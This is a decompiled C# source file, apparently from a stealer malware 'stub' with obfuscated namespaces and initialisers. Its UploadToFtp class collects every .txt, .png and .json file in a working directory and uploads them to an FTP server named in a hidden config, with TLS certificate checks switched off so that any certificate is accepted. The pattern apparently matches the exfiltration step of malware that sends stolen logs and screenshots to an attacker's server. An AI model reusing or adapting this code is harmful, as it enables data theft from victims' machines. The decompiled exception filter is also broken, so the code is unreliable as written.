using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000C9 RID: 201
	internal sealed class UploadToFtp
	{
		// Token: 0x060002FD RID: 765 RVA: 0x0001C31C File Offset: 0x0001A51C
		public static async Task UploadAllAsync(string ftpHost, string ftpUsername, string ftpPassword, bool useSsl = true, bool usePassive = true)
		{
			string localDir = Paths.InitWorkDir();
			ftpHost = Config.FtpHost;
			ftpUsername = Config.FtpUser;
			ftpPassword = Config.FtpPass;
			string[] files = (from f in Directory.GetFiles(localDir, "*.*", SearchOption.TopDirectoryOnly)
				where f.EndsWith(".txt", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".png", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".json", StringComparison.OrdinalIgnoreCase)
				select f).ToArray<string>();
			foreach (string file in files)
			{
				Console.WriteLine("Uploading: " + Path.GetFileName(file));
				TaskAwaiter taskAwaiter = UploadToFtp.SendMessageAsync(ftpHost, ftpUsername, ftpPassword, file, useSsl, usePassive).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				file = null;
			}
			string[] array = null;
		}

		// Token: 0x060002FE RID: 766 RVA: 0x0001C380 File Offset: 0x0001A580
		public static async Task SendMessageAsync(string ftpHost, string ftpUsername, string ftpPassword, string localFilePath, bool useSsl = true, bool usePassive = true)
		{
			FtpWebResponse response2;
			object obj;
			WebException ex3;
			bool flag;
			WebException ex;
			try
			{
				if (useSsl)
				{
					ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(UploadToFtp.IgnoreCertificateValidation);
				}
				string fileName = Path.GetFileName(localFilePath);
				string ftpUri = "ftp://" + ftpHost + "/" + fileName;
				FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpUri);
				request.Method = "STOR";
				request.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
				request.EnableSsl = useSsl;
				request.UsePassive = usePassive;
				request.KeepAlive = false;
				request.Timeout = 30000;
				request.ReadWriteTimeout = 30000;
				using (FileStream fileStream = File.OpenRead(localFilePath))
				{
					Stream stream = await request.GetRequestStreamAsync().ConfigureAwait(false);
					Stream requestStream = stream;
					stream = null;
					try
					{
						byte[] buffer = new byte[65536];
						for (;;)
						{
							ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter = fileStream.ReadAsync(buffer, 0, buffer.Length).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter.IsCompleted)
							{
								await configuredTaskAwaiter;
								ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
								configuredTaskAwaiter = configuredTaskAwaiter2;
								configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter);
							}
							int result = configuredTaskAwaiter.GetResult();
							int bytesRead;
							if ((bytesRead = result) <= 0)
							{
								break;
							}
							ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter3 = requestStream.WriteAsync(buffer, 0, bytesRead).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter3.IsCompleted)
							{
								await configuredTaskAwaiter3;
								ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter4;
								configuredTaskAwaiter3 = configuredTaskAwaiter4;
								configuredTaskAwaiter4 = default(ConfiguredTaskAwaitable.ConfiguredTaskAwaiter);
							}
							configuredTaskAwaiter3.GetResult();
						}
						buffer = null;
					}
					finally
					{
						if (requestStream != null)
						{
							((IDisposable)requestStream).Dispose();
						}
					}
					requestStream = null;
				}
				FileStream fileStream = null;
				ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter5 = request.GetResponseAsync().ConfigureAwait(false).GetAwaiter();
				if (!configuredTaskAwaiter5.IsCompleted)
				{
					await configuredTaskAwaiter5;
					ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter6;
					configuredTaskAwaiter5 = configuredTaskAwaiter6;
					configuredTaskAwaiter6 = default(ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter);
				}
				WebResponse webResponse = configuredTaskAwaiter5.GetResult();
				FtpWebResponse response = (FtpWebResponse)webResponse;
				webResponse = null;
				try
				{
					Console.WriteLine("Upload complete: " + response.StatusDescription);
				}
				finally
				{
					if (response != null)
					{
						((IDisposable)response).Dispose();
					}
				}
				response = null;
				fileName = null;
				ftpUri = null;
				request = null;
			}
			catch when (delegate
			{
				// Failed to create a 'catch-when' expression
				ex3 = obj as WebException;
				if (ex3 == null)
				{
					flag = false;
				}
				else
				{
					ex = ex3;
					response2 = ex.Response as FtpWebResponse;
					flag = (response2 != null) > false;
				}
				endfilter(flag);
			})
			{
				Console.WriteLine(string.Format("FTP Error: {0} - {1}", response2.StatusCode, response2.StatusDescription));
				throw;
			}
			catch (Exception ex2)
			{
				Console.WriteLine("FTP upload failed: " + ex2.Message);
				throw;
			}
		}

		// Token: 0x060002FF RID: 767 RVA: 0x0000F58C File Offset: 0x0000D78C
		private static bool IgnoreCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return true;
		}

		// Token: 0x06000300 RID: 768 RVA: 0x000038B4 File Offset: 0x00001AB4
		public UploadToFtp()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000301 RID: 769 RVA: 0x000038AD File Offset: 0x00001AAD
		static UploadToFtp()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
